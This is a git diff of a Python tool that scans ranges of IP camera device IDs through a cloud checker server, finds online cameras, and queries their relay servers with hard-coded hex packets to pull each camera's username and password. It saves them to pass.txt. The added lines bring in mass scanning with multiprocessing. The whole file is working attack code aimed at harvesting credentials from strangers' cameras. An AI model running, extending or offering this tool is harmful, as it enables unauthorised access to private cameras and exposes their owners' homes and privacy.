@@ -1,35 +1,107 @@
 import socket
+from socket import timeout
 import struct
+import multiprocessing
+import time
+import hashlib
+import os
 
 
 class server:
+    # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
+    SCAN_NEW_CAMS = True
+    FROM_ID = 10745000
+    TO_ID = 10746000
+    PACK_LIST = 100000  # SIZE LIST ID CAMS FOR 1 THREAD
+    SERVER_CHECKER = '47.74.66.18'
+    PORT_CHECKER = 8900
+    TMP_FILE = "tmp.txt"
+    #########################
+    # OTHER CONFIG
+    DEBUG = False
     SERVER = 'ipc1300.av380.net'
     PORT = 8877
-    ThreadCount = 0
     FileListCams = "cams.txt"
+    PassFile = "pass.txt"
     CamsList = None
 
     def __init__(self):
-        self.CamList(self.FileListCams)
         try:
+            if self.SCAN_NEW_CAMS:
+                self.GenerateListCams(f=self.FROM_ID, to=self.TO_ID)
+            self.RemoveDuplicate()
+            self.CamList(self.FileListCams)
             while True:
-                self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 if not bool(self.CamsList):
                     break
+                all_processes = []
                 for dev in self.CamsList:
-                    self.CreateSocket(dev)
-                result = (self.s.recvfrom(4096, 0))[0]
-                # print(f'Received response from server: {self.byte2str(result)}')  # debugging
-                result = self.ParseRelayServer(result)
-                id_cam = self.ConnectToRelay(result)
-                self.CamsList.remove(id_cam)
+                    if dev:
+                        self.process = multiprocessing.Process(target=self.CreateSocket, args=(dev,))
+                        all_processes.append(self.process)
+                        self.process.start()
+                for p in all_processes:
+                    p.join()
+
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
+
+    @staticmethod
+    def chunks(lst, count):
+        start = 0
+        for i in range(count):
+            stop = start + len(lst[i::count])
+            yield lst[start:stop]
+            start = stop
+
+    def GenerateListCams(self, **k):
+        x = list(self.chunks([*range(k['f'], k['to'])], self.TO_ID // self.PACK_LIST))
+
+        all_processes = []
+        for i in x:
+            self.process = multiprocessing.Process(target=self.CheckerOnline, args=(i,))
+            all_processes.append(self.process)
+            self.process.start()
+        for p in all_processes:
+            p.join()
+
+    def CheckerOnline(self, list_ids):
+        for i in list_ids:
+            hexID = bytes(str(i), 'utf-8').hex()
+            data = 'ac000000f3030000'
+            data += hexID
+            data += '2e6e766476722e6e657400000000000000000000000000006022000093f5d10000000000000000000000000000000000'
+            data = bytes.fromhex(data)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.SERVER_CHECKER, self.PORT_CHECKER))
+            sock.send(data)
+            response = sock.recv(4096)
+            sock.close()
+            if response[4] == 1:
+                print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
+                # Append-adds at last
+                with open(self.FileListCams, "a") as f:
+                    f.write(f"{i}\n")
+
+    def RemoveDuplicate(self):
+        lines_present = set()
+        The_Output_File = open(self.TMP_FILE, "w")
+        for l in open(self.FileListCams, "r"):
+            # finding the hash value of the current line
+            # Before performing the hash, we remove any blank spaces and new lines from the end of the line.
+            # Using hashlib library determine the hash value of a line.
+            hash_value = hashlib.md5(l.rstrip().encode('utf-8')).hexdigest()
+            if hash_value not in lines_present:
+                The_Output_File.write(l)
+                lines_present.add(hash_value)
+        # closing the output text file
+        The_Output_File.close()
+        os.replace(self.TMP_FILE, self.FileListCams)
 
     def ConnectToRelay(self, d):
         try:
             data = '32'
-            data += bytes(d['id'], 'utf-8').hex()
+            data += bytes(str(d['id']), 'utf-8').hex()
             data += '2e6e766476722e6e65740000000000000000000000000000302e30' \
                     '2e302e30000000000000000000018a1bc4d62f4a41ae000000000000 '
             data = bytes.fromhex(data)
@@ -43,8 +115,10 @@ class server:
                 print(f'\u001b[32m[+] DeviceID: {d["id"]}')
                 print(f'[+] Username: {username}')
                 print(f'[+] Password: {password}\u001b[37m')
-                with open("pass.txt", "a") as f:
+                with open(self.PassFile, "a") as f:
                     f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
+                self.CamsList.remove(d['id'])
+                relay_s.close()
                 return d["id"]
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
@@ -52,41 +126,76 @@ class server:
     @staticmethod
     def ParseRelayServer(data):
         try:
-            result = {'id': str(int(data[1:9])),
-                      'relay_server': data[33:data.find(b'\x00', 33)].decode('utf-8'),
-                      'relay_port': struct.unpack('<H', data[50:52])[0]}
-            print(
-                f'\u001b[32m[+] Relay found for id {result["id"]} {result["relay_server"]}:{result["relay_port"]}\u001b[37m')
-            return result
+            if data[1:3] != b'\x00\x00':
+                result = {'id': data[1:9].decode('utf-8'),
+                          'relay_server': data[33:data.find(b'\x00', 33)].decode('utf-8'),
+                          'relay_port': struct.unpack('<H', data[50:52])[0]}
+                print(
+                    f'\u001b[32m[+] Relay found for id {result["id"]} {result["relay_server"]}:{result["relay_port"]}\u001b[37m')
+                return result
+            else:
+                return False
         except:
             print("Ops")
 
     def CamList(self, fe):
         try:
             with open(fe) as f:
-                self.CamsList = [line.rstrip() for line in f]
+                self.CamsList = [line.rstrip() for line in f if line != []]
         except IOError as e:
             print(e)
         except:
             print("Fiddlesticks! Failed")
 
     def CreateSocket(self, dev):
-        print("\u001b[32m[+]Socket successfully created\u001b[37m")
-        data = '02070032303038333131323334333734313100020c17222d0000'
-        data += bytes(dev, 'utf-8').hex()
-        data += '2e6e766476722e6e65740000000000000000000000000000'
-        data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
-        data = bytes.fromhex(data)
-        result = self.send_data(self.s, data, self.SERVER, self.PORT)
-        # print(f'Response from server: {self.byte2str(result)}')
+        try:
+            with open(self.PassFile, 'r') as f:
+                for index, line in enumerate(f):
+                    # search string
+                    if dev in line:
+                        self.CamsList.remove(dev)
+                        break
+            check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            if self.DEBUG:
+                print("\u001b[31mPID: %s\u001b[37m" % self.process.pid)
+                print("\u001b[32m[+]Send request for id: %s\u001b[37m" % dev)
+            data = '02070032303038333131323334333734313100020c17222d0000'
+            data += bytes(str(dev), 'utf-8').hex()
+            data += '2e6e766476722e6e65740000000000000000000000000000'
+            data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
+            data = bytes.fromhex(data)
+            self.send_data(check_s, data, self.SERVER, self.PORT)
+            check_s.settimeout(20)
+            print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
+            time.sleep(0.001)
+            result = (check_s.recvfrom(4096, 0))[0]
+            if result[6:7] == b'\x00':
+                self.CamsList.remove(dev)
+            else:
+                result = self.ParseRelayServer(result)
+                id_cam = self.ConnectToRelay(result)
+                self.CamsList.remove(id_cam)
+                check_s.close()
+        except timeout:
+            print('caught a timeout')
+
+    def DeleteStrForFile(self, idDelete):
+        delete_list = [idDelete]
+        with open(self.FileListCams) as fin, open(self.TMP_FILE, "w+") as fout:
+            for line in fin:
+                for word in delete_list:
+                    line = line.replace(word, "")
+                fout.write(line)
+            os.replace(self.TMP_FILE, self.FileListCams)
+            self.RemoveDuplicate()
 
     @staticmethod
     def byte2str(s):
         return "".join(map(chr, s))
 
-    @staticmethod
-    def send_data(s, data, serv, port):
-        print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
+    def send_data(self, s, data, serv, port):
+        if self.DEBUG:
+            print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
         # print(self.byte2str(data))
         try:
             s.sendto(data, (serv, port))
@@ -96,7 +205,9 @@ class server:
         return response[0]
 
     def __del__(self):
-        print(f"{self.__class__} FINISHED")
+        if self.DEBUG:
+            print(f"\u001b[34m{self.__class__} PID: {self.process.pid} FINISHED \u001b[37m")
 
 
-p = server()
+if __name__ == "__main__":
+    func = server()
